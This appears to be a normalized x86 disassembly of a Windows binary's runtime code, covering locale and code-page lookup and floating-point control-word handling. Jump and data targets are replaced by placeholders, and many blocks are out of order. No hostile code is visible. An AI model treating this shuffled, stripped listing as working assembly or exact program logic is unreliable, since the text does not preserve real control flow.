lea ebx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
sub ecx ebx
sar ecx 0x1
cmp ecx [ esi + 0x5c ]
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
sub ecx ebx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push edi
push 0x55
push edx
call sub_41f7c7
add esp 0x10
test eax eax
je r-xdata
or [ esi + 0x58 ] 0x1
mov ecx edi
lea edx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
jmp r-xdata
xor ebx ebx
push edi
call sub_42131c
pop ecx
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
jmp r-xdata
or [ esi + 0x58 ] 0x100
lea edx [ esi + 0x2a0 ]
xor eax eax
cmp [ edx ] ax
jne r-xdata
mov ebx [ esi + 0x50 ]
xor edx edx
lea ecx [ ebx + 0x2 ]
call sub_413b2e
int3
mov ecx edi
lea ebx [ ecx + 0x2 ]
mov ax [ ebx ]
add ebx 0x2
cmp ax dx
jne r-xdata
push [ esi + 0x50 ]
sub ebx ecx
sar ebx 0x1
call sub_420e56
pop ecx
cmp eax ebx
je r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
jmp r-xdata
sub_421174
mov edi edi
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_41aa93
mov esi eax
lea eax [ ebp - 0xf4 ]
push 0x78
push eax
mov ecx [ esi + 0x60 ]
neg ecx
sbb ecx ecx
and ecx 0xfffff002
add ecx 0x1001
push ecx
push edi
call sub_41c093
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ esi + 0x50 ]
call sub_424d11
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x58 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x58 ]
shr eax 0x2
not eax
and eax 0x1
mov ecx edi
push ebx
xor ebx ebx
lea edx [ ecx + 0x2 ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0xc
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push edi
lea eax [ esi + 0x2a0 ]
push 0x55
push eax
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413b2e
int3
or [ esi + 0x58 ] 0x4
pop ebx
sub_421235
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x20001004
add eax 0x250
push eax
call sub_41c093
test eax eax
jne r-xdata
xor eax eax
cmp [ ecx ] ax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov esi r--data
mov edx ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetACP@IAT ]
sbb edx edx
or edx 0x1
test di di
je r-xdata
mov esi r--data
mov edx ecx
mov edx eax
jmp r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
sbb eax eax
or eax 0x1
test di di
je r-xdata
test edx edx
je r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
push ecx
call sub_4160a2
pop ecx
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x2000000b
add eax 0x250
push eax
call sub_41c093
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
jmp r-xdata
sub_42131c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push 0x9
push eax
push 0x59
push esi
call sub_41c093
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
push 0x9
lea eax [ ebp - 0x18 ]
push esi
push eax
call sub_4207ab
add esp 0xc
neg eax
sbb eax eax
inc eax
sub_421367
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
xor edx edx
push edi
inc edx
xor edi edi
test esi esi
js r-xdata
xor eax eax
test edx edx
pop edi
sete al
pop esi
mov esp ebp
pop ebp
retn
push ebx
pop ebx
lea eax [ edi + esi ]
cdq
sub eax edx
mov ebx eax
mov eax [ ebp + 0x8 ]
sar ebx 0x1
imul ecx ebx 0xc
mov [ ebp - 0x4 ] ecx
push [ ecx + eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_424d11
mov edx eax
pop ecx
pop ecx
test edx edx
jne r-xdata
jns r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax 0x4
add ecx eax
mov eax [ ebp + 0x10 ]
mov [ eax ] ecx
jmp r-xdata
lea edi [ ebx + 0x1 ]
lea esi [ ebx - 0x1 ]
jmp r-xdata
cmp edi esi
jle r-xdata
test edx edx
je r-xdata
sub_4213d6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
call sub_41aa93
mov ebx [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x8 ] ecx
lea esi [ eax + 0x50 ]
lea eax [ esi + 0x250 ]
mov [ esi + 0x8 ] ecx
mov [ eax ] cx
lea edi [ esi + 0x4 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x80 ]
mov [ esi ] ebx
mov [ edi ] eax
cmp [ eax ] cx
je r-xdata
mov eax [ esi ]
push esi
cmp [ eax ] cx
je r-xdata
push edi
push 0x16
push r--data
call sub_421367
add esp 0xc
xor ecx ecx
call sub_420cd8
mov eax [ edi ]
cmp [ eax ] cx
je r-xdata
xor eax eax
lea eax [ ebx + 0x100 ]
push esi
push eax
call sub_421235
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_420dfb
call sub_420d61
jmp r-xdata
cmp esi 0xfde8
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
je r-xdata
push esi
push 0x40
push r--data
call sub_421367
add esp 0xc
test eax eax
je r-xdata
xor eax eax
pop ecx
cmp [ esi + 0x8 ] eax
jne r-xdata
cmp esi 0xfde9
je r-xdata
mov eax [ edi ]
xor ecx ecx
push esi
cmp [ eax ] cx
je r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
call sub_420dfb
jmp r-xdata
call sub_420d61
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
pop ecx
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov [ eax ] esi
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
lea ebx [ edi + 0x120 ]
xor eax eax
mov [ ebx ] ax
lea edx [ ecx + 0x2 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x8 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push [ ebp - 0x4 ]
push 0x55
push ebx
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
push 0x40
push edi
push 0x1001
push ebx
call sub_41c093
test eax eax
je r-xdata
push 0x40
lea ebx [ edi + 0x80 ]
push ebx
push 0x1002
lea eax [ edi + 0x120 ]
push eax
call sub_41c093
test eax eax
je r-xdata
push 0x5f
push ebx
call sub_42a01b
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x40
push ebx
push 0x7
lea eax [ edi + 0x120 ]
push eax
call sub_41c093
test eax eax
je r-xdata
push 0x2e
push ebx
call sub_42a01b
pop ecx
pop ecx
test eax eax
je r-xdata
push 0xa
push 0x10
lea eax [ edi + 0x100 ]
push eax
push esi
call sub_4277fc
add esp 0x10
sub_4215a5
mov edi edi
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_41aa93
mov ebx eax
call sub_41aa93
push esi
mov edi [ eax + 0x34c ]
call sub_421ae9
pop ecx
mov ecx [ ebx + 0x64 ]
mov esi eax
neg ecx
lea eax [ ebp - 0xf4 ]
push 0x78
sbb ecx ecx
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x54 ]
call sub_424d11
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
inc eax
jmp r-xdata
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
push esi
call sub_421c1d
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
or [ edi ] 0x4
mov [ edi + 0x8 ] esi
mov [ edi + 0x4 ] esi
sub_42164e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
call sub_41aa93
mov edx eax
xor edi edi
mov ecx [ edx + 0x54 ]
lea esi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx esi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
push 0x1
sete al
push sub_4215a5
mov [ edx + 0x64 ] eax
call [ EnumSystemLocalesW@IAT ]
mov eax [ ebp + 0x8 ]
test [ eax ] 0x4
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ eax ] edi
sub_421699
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_41aa93
mov esi eax
xor ebx ebx
push 0x2
pop edx
mov ecx [ esi + 0x50 ]
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
mov ecx [ esi + 0x54 ]
sete al
mov [ esi + 0x60 ] eax
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
mov edi [ ebp + 0x8 ]
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x64 ] eax
mov [ edi + 0x4 ] ebx
cmp [ esi + 0x60 ] ebx
jne r-xdata
push 0x1
push sub_4217c1
mov [ esi + 0x5c ] edx
call [ EnumSystemLocalesW@IAT ]
mov ecx [ edi ]
test cl 0x7
setne dl
bt ecx 0x9
setb al
and dl al
bt ecx 0x8
setb al
test al dl
jne r-xdata
push [ esi + 0x50 ]
call sub_421795
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ edi ] ebx
sub_421734
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_41aa93
mov esi eax
xor ebx ebx
push 0x2
pop edx
mov ecx [ esi + 0x50 ]
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x60 ] eax
test eax eax
jne r-xdata
push 0x1
push sub_421a11
mov [ esi + 0x5c ] edx
call [ EnumSystemLocalesW@IAT ]
mov eax [ ebp + 0x8 ]
test [ eax ] 0x4
jne r-xdata
push [ esi + 0x50 ]
call sub_421795
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ eax ] ebx
sub_421795
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
add eax 0xffffff9f
cmp ax 0x19
ja r-xdata
cmp ax 0x5a
jbe r-xdata
mov eax edx
pop ebp
retn
inc edx
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
cmp ax 0x41
jb r-xdata
sub_4217c1
mov edi edi
push ebp
mov ebp esp
sub esp 0xfc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_41aa93
mov ebx eax
call sub_41aa93
push esi
mov edi [ eax + 0x34c ]
call sub_421ae9
pop ecx
mov ecx [ ebx + 0x64 ]
mov esi eax
neg ecx
lea eax [ ebp - 0xf4 ]
push 0x78
sbb ecx ecx
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x54 ]
call sub_424d11
and [ ebp - 0xf8 ] 0x0
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] 0x0
mov eax [ edi ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
push 0x78
lea eax [ ebp - 0xf4 ]
push eax
mov eax [ ebx + 0x60 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
mov ecx [ ebx + 0x60 ]
lea eax [ ebp - 0xf4 ]
neg ecx
push 0x78
sbb ecx ecx
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_424d11
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_424d11
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ edi ] eax
jmp r-xdata
test [ edi ] 0x2
jne r-xdata
or [ edi ] 0x304
mov [ edi + 0x4 ] esi
jmp r-xdata
xor eax eax
cmp [ ebx + 0x60 ] eax
jne r-xdata
or [ edi ] 0x200
mov edx [ edi ]
cmp [ ebx + 0x60 ] eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov [ edi + 0x8 ] esi
cmp [ ebx + 0x5c ] eax
je r-xdata
cmp [ ebx + 0x5c ] eax
je r-xdata
or edx 0x100
mov [ edi ] edx
mov edx [ edi ]
test dl 0x1
jne r-xdata
push [ ebx + 0x5c ]
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_427831
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_424d11
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebx + 0x50 ]
lea eax [ ecx + 0x2 ]
mov [ ebp - 0xfc ] eax
jne r-xdata
push esi
call sub_421c1d
pop ecx
test eax eax
je r-xdata
or [ edi ] 0x2
mov [ edi + 0x8 ] esi
mov ecx [ ebx + 0x50 ]
lea edx [ ecx + 0x2 ]
push edi
xor ebx ebx
push ebx
push esi
call sub_421c41
add esp 0xc
test eax eax
je r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0xf8 ]
jne r-xdata
sub ecx [ ebp - 0xfc ]
sar ecx 0x1
cmp ecx [ ebx + 0x5c ]
jne r-xdata
mov [ edi + 0x4 ] esi
or edx 0x1
mov [ edi ] edx
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0xf8 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
cmp ecx [ ebx + 0x5c ]
jne r-xdata
or [ edi ] 0x100
cmp [ edi + 0x4 ] ebx
xor eax eax
jmp r-xdata
push edi
push 0x1
push esi
call sub_421c41
add esp 0xc
test eax eax
je r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
or [ edi ] 0x100
xor eax eax
jmp r-xdata
cmp [ edi + 0x4 ] eax
jmp r-xdata
sub_421a11
mov edi edi
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_41aa93
mov ebx eax
call sub_41aa93
push esi
mov edi [ eax + 0x34c ]
call sub_421ae9
pop ecx
mov ecx [ ebx + 0x60 ]
mov esi eax
neg ecx
lea eax [ ebp - 0xf4 ]
push 0x78
sbb ecx ecx
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_424d11
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
inc eax
jmp r-xdata
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
cmp [ ebx + 0x60 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
cmp [ ebx + 0x5c ] 0x0
je r-xdata
or [ edi ] 0x4
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
push edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_424d11
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_421c41
add esp 0xc
test eax eax
je r-xdata
push edi
push eax
sub_421ae9
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
xor esi esi
movzx ecx [ edx ]
test cx cx
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push edi
push 0x5
pop edi
lea eax [ ecx - 0x41 ]
cmp ax di
ja r-xdata
add ecx 0xffd9
jmp r-xdata
movzx ecx cx
add ecx 0xffffffd0
shl esi 0x4
add esi ecx
movzx ecx [ edx ]
test cx cx
jne r-xdata
add ecx 0xfff9
lea eax [ ecx - 0x61 ]
lea edx [ edx + 0x2 ]
cmp ax di
ja r-xdata
pop edi
sub_421b3a
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x20001004
push [ eax + 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
xor eax eax
cmp [ ecx ] ax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov esi r--data
mov edx ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetACP@IAT ]
sbb edx edx
or edx 0x1
test di di
je r-xdata
mov esi r--data
mov edx ecx
mov edx eax
jmp r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
sbb eax eax
or eax 0x1
test di di
je r-xdata
test edx edx
je r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
push ecx
call sub_4160a2
pop ecx
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x2000000b
push [ eax + 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
jmp r-xdata
sub_421c1d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_421c41
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
call sub_41aa93
mov esi [ ebp + 0x8 ]
mov edi eax
push 0x2
lea eax [ ebp - 0x4 ]
mov ecx esi
push eax
and ecx 0x3ff
push 0x20000001
or ecx 0x400
push ecx
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ edi + 0x50 ]
lea ecx [ esi + 0x2 ]
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
push [ edi + 0x50 ]
sub esi ecx
sar esi 0x1
call sub_421795
pop ecx
cmp eax esi
je r-xdata
sub_421cb1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
test esi esi
js r-xdata
xor al al
lea eax [ ebx + esi ]
cdq
sub eax edx
mov edi eax
mov eax [ ebp + 0x8 ]
sar edi 0x1
imul ecx edi 0xc
push [ ecx + eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_424d11
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
imul eax edi 0xc
add ecx 0x4
add eax ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov al 0x1
jmp r-xdata
jns r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
lea ebx [ edi + 0x1 ]
lea esi [ edi - 0x1 ]
jmp r-xdata
cmp ebx esi
jle r-xdata
sub_421d0e
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x18 ] eax
call sub_41aa93
add eax 0x50
lea edi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
call sub_41aa93
lea ecx [ ebp - 0x10 ]
xor edx edx
mov [ eax + 0x34c ] ecx
lea ecx [ esi + 0x80 ]
mov eax [ ebp - 0x14 ]
mov [ eax ] esi
lea edi [ eax + 0x4 ]
mov [ edi ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] edx
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ ecx ] dx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp [ eax ] dx
je r-xdata
mov eax [ r--data ]
push edi
dec eax
push eax
push r--data
call sub_421cb1
mov eax [ ebp - 0x14 ]
add esp 0xc
xor edx edx
mov [ ebp - 0x10 ] 0x104
call [ GetUserDefaultLCID@IAT ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
cmp [ eax ] dx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ esi + 0x100 ]
neg esi
sbb esi esi
and esi eax
push esi
call sub_421b3a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
xor eax eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42164e
pop ecx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_421734
cmp [ eax ] dx
je r-xdata
cmp esi 0xfde8
je r-xdata
xor edi edi
xor edi edi
mov eax [ r--data ]
push [ ebp - 0x14 ]
dec eax
push eax
push r--data
call sub_421cb1
add esp 0xc
test al al
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_421699
jmp r-xdata
cmp esi 0xfde9
je r-xdata
mov eax [ edi ]
xor edi edi
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop ecx
jne r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_421734
cmp [ eax ] di
je r-xdata
push 0x1
push [ ebp - 0xc ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_421699
jmp r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
pop ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
push edi
push 0x55
add eax 0x250
push eax
push [ ebp - 0xc ]
call sub_41c229
test ebx ebx
je r-xdata
mov [ eax ] esi
xor eax eax
inc eax
jmp r-xdata
push edi
push 0x55
lea eax [ ebx + 0x120 ]
push eax
push [ ebp - 0xc ]
call sub_41c229
push 0x40
push ebx
push 0x1001
push [ ebp - 0xc ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
push 0x40
lea eax [ ebx + 0x80 ]
push eax
push 0x1002
push [ ebp - 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push 0xa
push 0x10
lea ecx [ ebx + 0x100 ]
push ecx
push esi
call sub_4277fc
add esp 0x10
sub_421f15
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
push ebx
push esi
push edi
mov edi 0x200
test cl 0x8
je r-xdata
mov eax 0x80
test cl 0x4
je r-xdata
or eax edi
test cl 0x2
je r-xdata
or eax 0x400
test cl 0x1
je r-xdata
or eax 0x800
mov esi 0x100
test ecx 0x80000
je r-xdata
or eax 0x1000
mov edx ecx
mov ebx 0x300
and edx ebx
je r-xdata
or eax esi
mov edx 0x3000000
pop edi
and ecx edx
pop esi
pop ebx
cmp ecx 0x1000000
je r-xdata
cmp edx esi
je r-xdata
or eax 0x8040
cmp ecx 0x2000000
je r-xdata
or eax 0x2000
cmp edx edi
je r-xdata
or eax 0x40
pop ebp
retn
cmp ecx edx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp edx ebx
jne r-xdata
pop ebp
retn
or eax 0x8000
pop ebp
retn
or eax 0x6000
jmp r-xdata
sub_421fc0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
fnstsw [ ebp - 0x4 ]
fnclex
cmp [ rw-data ] 0x1
jl r-xdata
mov cx [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
mov ax [ ebp - 0x4 ]
xor ecx ecx
mov edx ecx
push edi
mov edi 0x80000
test al 0x3f
je r-xdata
mov esp ebp
pop ebp
retn
test cl 0x1
je r-xdata
stmxcsr [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
and eax 0xffffffc0
mov [ ebp - 0xc ] eax
ldmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
test al 0x3f
je r-xdata
test al 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
or ecx edx
mov eax ecx
pop edi
jmp r-xdata
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop edx
test cl 0x8
je r-xdata
or eax 0x8
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or edx 0x8
test cl 0x10
je r-xdata
or eax 0x4
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or edx 0x4
test cl 0x20
je r-xdata
or eax 0x2
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or edx 0x2
test cl 0x2
je r-xdata
or eax 0x1
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or edx 0x1
or eax 0x80000
test al 0x2
je r-xdata
or ecx 0x1
or edx edi
or ecx edi
sub_42209e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
fwait
fnstcw [ ebp - 0x8 ]
mov ax [ ebp - 0x8 ]
xor ecx ecx
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
push ebx
push esi
movzx esi ax
mov ebx 0xc00
mov edx esi
push edi
mov edi 0x200
and edx ebx
je r-xdata
or ecx 0x80000
and esi 0x300
je r-xdata
cmp edx 0x400
je r-xdata
or ecx 0x20000
cmp esi edi
jne r-xdata
or ecx 0x100
cmp edx 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov esi edi
mov eax [ ebp + 0x8 ]
not esi
and esi ecx
and eax edi
or esi eax
cmp esi ecx
je r-xdata
or ecx 0x40000
mov edx 0x1000
test dx ax
je r-xdata
or ecx 0x10000
jmp r-xdata
or ecx edi
jmp r-xdata
cmp edx ebx
jne r-xdata
